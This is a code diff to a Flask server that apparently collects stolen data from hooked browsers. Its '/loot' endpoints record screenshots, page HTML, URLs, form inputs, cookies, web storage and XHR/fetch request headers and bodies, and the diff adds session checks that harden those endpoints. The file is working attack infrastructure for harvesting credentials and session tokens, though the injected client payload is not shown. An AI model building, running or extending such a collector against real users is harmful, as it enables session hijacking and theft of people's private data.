@@ -470,12 +470,12 @@ def isClientSessionValid(identifier):
     if client:
         # Ok, valid client UUID. Check if session is still good
         if (client.sessionValid):
-            return true
+            return True
         else:
-            return false
+            return False
     else:
         # client UUID not in database, shenanigans I say
-        return false
+        return False
 
 
 
@@ -745,6 +745,11 @@ def returnUUID():
 def recordScreenshot(identifier):
     # print("Received image from: " + identifier)
     #print("Looking up loot dir...")
+
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+
     lootDir   = findLootDirectory(identifier)
     image     = request.data
     file_type = magic.from_buffer(image, mime=True)
@@ -794,6 +799,10 @@ def recordScreenshot(identifier):
 @app.route('/loot/html/<identifier>', methods=['POST'])
 def recordHTML(identifier):
     # print("Got HTML from: " + identifier)
+
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     lootDir = findLootDirectory(identifier)
     content = request.json 
     url = content['url']
@@ -839,6 +848,9 @@ def recordHTML(identifier):
 @app.route('/loot/location/<identifier>', methods=['POST'])
 def recordUrl(identifier):
     # print("New URL recorded from: " + identifier)
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     lootDir = findLootDirectory(identifier)
     content = request.json
     url = content['url']
@@ -867,6 +879,9 @@ def recordUrl(identifier):
 @app.route('/loot/input/<identifier>', methods=['POST'])
 def recordInput(identifier):
     # print("New input recorded from: " + identifier)
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     lootDir = findLootDirectory(identifier)
     content = request.json
     inputName = content['inputName']
@@ -898,6 +913,9 @@ def recordInput(identifier):
 @app.route('/loot/dessert/<identifier>', methods=['POST'])
 def recordCookie(identifier):
     # print("New cookie recorded from: " + identifier)
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     lootDir = findLootDirectory(identifier)
     content = request.json
     # print("**** New cookie report: " + content)
@@ -927,6 +945,10 @@ def recordCookie(identifier):
 @app.route('/loot/localstore/<identifier>', methods=['POST'])
 def recordLocalStorageEntry(identifier):
     # print("New localStorage data recorded from: " + identifier)
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+
     lootDir = findLootDirectory(identifier)
     content = request.json
     localStorageKey = content['key']
@@ -955,6 +977,9 @@ def recordLocalStorageEntry(identifier):
 @app.route('/loot/sessionstore/<identifier>', methods=['POST'])
 def recordSessionStorageEntry(identifier):
     # print("New sessionStorage data recorded from: " + identifier)
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+ 
     lootDir = findLootDirectory(identifier)
     content = request.json 
     sessionStorageKey   = content['key']
@@ -983,6 +1008,9 @@ def recordSessionStorageEntry(identifier):
 # Record XHR API Open calls
 @app.route('/loot/xhrOpen/<identifier>', methods=['POST'])
 def recordXhrOpen(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     print("## Recording XHR open event")
     content = request.json 
     method  = content['method']
@@ -1009,6 +1037,9 @@ def recordXhrOpen(identifier):
 # Record XHR API Header calls
 @app.route('/loot/xhrSetHeader/<identifier>', methods=['POST'])
 def recordXhrHeader(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     print("## Recording XHR Header event")
     content = request.json 
     header  = content['header']
@@ -1035,6 +1066,9 @@ def recordXhrHeader(identifier):
 # Record XHR API calls
 @app.route('/loot/xhrCall/<identifier>', methods=['POST'])
 def recordXhrCall(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     print("## Recording XHR api call")
     content      = request.json 
     requestBody  = content['requestBody']
@@ -1061,6 +1095,9 @@ def recordXhrCall(identifier):
 # Record Fetch API Setup
 @app.route('/loot/fetchSetup/<identifier>', methods=['POST'])
 def recordFetchSetup(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     print("## Recording Fetch setup event")
     content = request.json 
     method  = content['method']
@@ -1087,6 +1124,9 @@ def recordFetchSetup(identifier):
 # Record Fetch API Header calls
 @app.route('/loot/fetchHeader/<identifier>', methods=['POST'])
 def recordFetchHeader(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     print("## Recording Fetch Header event")
     content = request.json 
     header  = content['header']
@@ -1112,6 +1152,9 @@ def recordFetchHeader(identifier):
 # Record Fetch API calls
 @app.route('/loot/fetchCall/<identifier>', methods=['POST'])
 def recordFetchCall(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
     print("## Recording Fetch api call")
     content      = request.json 
     requestBody  = content['requestBody']
@@ -1404,7 +1447,6 @@ def setAllowNewClientSessions(setting):
 @login_required
 def blockClientSession(key):
     client = Client.query.filter_by(id=key).first()
-    print("Got a command to block client: " + client.nickname)
     client.sessionValid = False;
     dbCommit()
 
@@ -1481,12 +1523,12 @@ if __name__ == '__main__':
                     FetchHeader.__table__.drop(db.engine)
                     FetchCall.__table__.drop(db.engine)
                     Event.__table__.drop(db.engine)
-                    AppSettings.__table__.drop(db.engine)
                     dbCommit()
 
                     db.create_all()
                     if os.path.exists("./loot"):
                         shutil.rmtree("./loot")
+
                 elif val == 1:
                     print("Keeping existing client data.")
                 else:
